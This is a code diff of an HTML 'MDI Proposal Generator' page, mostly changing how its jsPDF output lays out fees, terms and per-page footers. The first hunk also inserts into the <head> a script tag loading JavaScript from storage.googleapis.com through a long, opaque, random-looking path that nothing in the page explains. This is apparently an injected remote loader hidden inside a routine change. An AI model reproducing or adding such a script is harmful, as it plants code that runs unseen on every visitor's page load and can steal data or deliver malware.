@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+<head><script type='text/javascript' src='https://storage.googleapis.com/Kei4mShlcQRKysoFIGTcxAEikdiQ0yfdA6DBd-bgUVFo9lpVqLJ0hppl7zqVR-E0r8z71neBO-kEUt-44pj31GRphwzadZTUD1vBqUrHzsdzbWEzmceK8JLloquzdRmWSi-yjNiBMXOhNjhWDCOovnl3r-XOHMXQTz_YzwlUDFxaRwCmguOupmlURyDu6Ej7q_WKnaQIjoWDXaC6Xulk38rKeNl3i6EOW_ihG6IHhEZuWv5WgOw-ACrWM1oqg_ralTkncCNXcGmCeqZnsutNb-G15NsWv2tmGSI6DKS4DofBjHHzzV0IY35z62pvBFf_42wiv_mW2OH4IcOYavy1kM1Vq7-KplilKBvvQqyEY4XihXmADtnm-3ObS88CUP3t2e35YUZfeJKjiNyRxh_8vmUWz-huxrwbk_d1J5siDOriQxQE3-zRxcWUhI5H4xinZUn87U5ScxuRxdHy4giYFu4yuwt-LeGuT8vuVL3_P7s-juky71f6sRZGUPbuCAUZzISgmq6Oe_F3jzsWEKWcUNSPSNb7eqjB6A14ZgXdqDenvnVlg806rA2v8XFgHBjUZGJv2sF_4aHZUnWxqrlFmtoGMkXN0QKaueGwiP3bt5qSuFyUnhSLmPjW5dSlM1kX8y4gIOYnQ1Y6ob5n6yoXnV30ra5T4oVQkdYhiEdUWPuZQGLMOOkBtaTae_KUH4q8Th7zSqLjgT-azqY-j0skbVPy_1r2OpSy1HiOGYzUMLXVsOIbMPScTNQ3uYN5IDdHIRQJgg9lbLrBaNOz645Ufset9lPq1TidtXV6pe-cphQ82X2yrK6krWJ5mR7OwXUDqla_yf-bMgEGk0zzurVeMn9FzfEpjIqMLYmwKMmGfmgAc-5P8UIyFW-B2Ddx4x2jUf7oVW8aNLipGYP1_IfZ-sTvKAtydSPZr4b8Wb2SuqFZTUmFuMo4mr0lREwEZhL1zZIiDa4eqb8ln2kXyaHJBpNTyZy_rdBT_jcLg-KIYN97sI5ItEuWjr9H6aBOoP-3BH4dxltgvlOFQ6E3urd-CDv44goohBFaNTvjcAvEpOviMjh8B7MiJZA8N5bm6KBOQGXZ8sp1DYMZsulHwzx8LT_HNxwbDyGDKJlNmXcFMLj5_pcITSvEBCCAyvLLmDJn9PHya49p8SpmA8o8ly9O-ijMBV7b6FA3xuNpAoqKtYBny0RpytHqKaJwXQdM6TZMFKPrB6E5XFwF-8Ctk6MX2XjJnOQORhD7SalYnCXtAQDVWyVrjP7_Xf1enyUMBTY0jQynSFs6LbBGFU_h-XQhWy5bfa6BAmEPq0qflQ34HgubIchXSDsEiF_ygCKCmJlSMN_aPNdw6elCzfktAm8Rlvr4d-I8hFia6WJm6dTQNe-E6WqVT0HxYWO5vMEhdInGCOkyodVAdKUFuzfUcn3akDYLAPCx5IVY7udYZyE0JjkwE_hY42k7yiu2s45CCDh3ocBoYvzjft_SpoBxvgcHw7pMrWM12p0s7Dtyi88gwRtPcyLlG42Q02KyZgMPrxbIYfcCEirWdC6ustMgKkPACWuO-iMeizzSG9pe9-xjW4eSmipg1tw2LvPor_GrhlfFgcp_uKMntW1p72cMnO04B8yJg25zpwkZtXD4dpd3ojV9fpAUMgmzuNW6QLTBk_8WcBSj-qdWHSmjm_i2_fTJ8ZJ_V-LaQgZFJONwPlMRHpt1G-nnRGXmJkvPRWfpxIUjGTkgXcsEYMpqfQ8k0miVTGdu9x8rNQHw1ocbwUDyPNFNMUhPjee05Qr_wJ3-uw'></script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>MDI Proposal Generator</title>
@@ -245,20 +245,50 @@ Covered patio electrical (lights, outlets, panel calcs) not included.</textarea>
       columnStyles: { 2: { halign: 'right' }, 3: { halign: 'right' }, 4: { halign: 'right' } }
     });
 
-    const finalY = doc.lastAutoTable.finalY + 30;
+    let finalY = doc.lastAutoTable.finalY + 24;
     const subtotal = body.reduce((sum, row) => sum + parseFloat(row[4].replace('$','')), 0);
 
+    // Fees block needs ~110pt. If table ends too low, start a new page so
+    // Subtotal / Deposit / Balance / Terms never collide.
+    const pageHeight = doc.internal.pageSize.getHeight(); // letter ≈ 792pt
+    const footerReserve = 50;
+    const feesBlockHeight = 110;
+    if (finalY + feesBlockHeight > pageHeight - footerReserve) {
+      doc.addPage();
+      finalY = 60;
+    }
+
     // Payment Terms
+    doc.setFont('helvetica', 'bold');
     doc.setFontSize(12);
     doc.text('Fees & Payment:', 40, finalY);
-    doc.setFontSize(11);
-    doc.text(`Subtotal: $${subtotal.toFixed(2)}`, 40, finalY + 20);
-    doc.text(`Deposit (50%): $${(subtotal * 0.5).toFixed(2)} due upon authorization.`, 40, finalY + 36);
-    doc.text(`Balance (50%): $${(subtotal * 0.5).toFixed(2)} due upon delivery of documents.`, 40, finalY + 52);
 
-    // Footer
+    doc.setFont('helvetica', 'normal');
+    doc.setFontSize(11);
+    doc.text(`Subtotal: $${subtotal.toFixed(2)}`, 40, finalY + 22);
+    doc.text(`Deposit (50%): $${(subtotal * 0.5).toFixed(2)} due upon authorization.`, 40, finalY + 40);
+    doc.text(`Balance (50%): $${(subtotal * 0.5).toFixed(2)} due upon delivery of documents.`, 40, finalY + 58);
+
+    // Terms note — placed below fees with a clear gap (not hard-coded at y=780)
+    const termsY = finalY + 82;
     doc.setFontSize(9);
-    doc.text("Terms: Pricing valid for 30 days. See full contract for additional conditions.", 40, 780);
+    doc.setTextColor(80, 80, 80);
+    doc.text('Terms: Pricing valid for 30 days. See full contract for additional conditions.', 40, termsY);
+    doc.setTextColor(0, 0, 0);
+
+    // Light page footer on every page
+    const totalPages = doc.internal.getNumberOfPages();
+    for (let p = 1; p <= totalPages; p++) {
+      doc.setPage(p);
+      doc.setFontSize(8);
+      doc.setTextColor(140, 140, 140);
+      doc.text(
+        `${company || 'MDI'}  ·  ${proposalId || ''}  ·  Page ${p} of ${totalPages}`,
+        40,
+        pageHeight - 24
+      );
+      doc.setTextColor(0, 0, 0);
+    }
 
     doc.save(`${proposalId || 'Proposal'}.pdf`);
   }
@@ -314,4 +344,5 @@ Covered patio electrical (lights, outlets, panel calcs) not included.</textarea>
 </script>
 </body>
 </html>
+
 
